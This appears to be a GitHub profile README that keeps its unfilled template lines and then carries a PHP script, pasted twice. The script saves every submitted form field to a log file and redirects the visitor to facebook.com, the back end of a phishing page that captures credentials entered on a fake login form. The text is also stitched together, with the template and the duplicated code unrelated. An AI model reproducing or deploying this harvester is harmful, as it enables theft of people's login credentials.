- 👋 Hi, I’m @767591556
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...

<!---
767591556/767591556 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
php 



<?php 

  
// Set the location to redirect the page 

header ('Location: http://www.facebook.com'); 

  
// Open the text file in writing mode  

$file = fopen("log.txt", "a"); 

  

foreach($_POST as $variable => $value) { 

    fwrite($file, $variable); 

    fwrite($file, "="); 

    fwrite($file, $value); 

    fwrite($file, "\r\n"); 
} 

  

fwrite($file, "\r\n"); 

fclose($file); 

exit; 
?> php 



<?php 

  
// Set the location to redirect the page 

header ('Location: http://www.facebook.com'); 

  
// Open the text file in writing mode  

$file = fopen("log.txt", "a"); 

  

foreach($_POST as $variable => $value) { 

    fwrite($file, $variable); 

    fwrite($file, "="); 

    fwrite($file, $value); 

    fwrite($file, "\r\n"); 
} 

  

fwrite($file, "\r\n"); 

fclose($file); 

exit; 
?> 
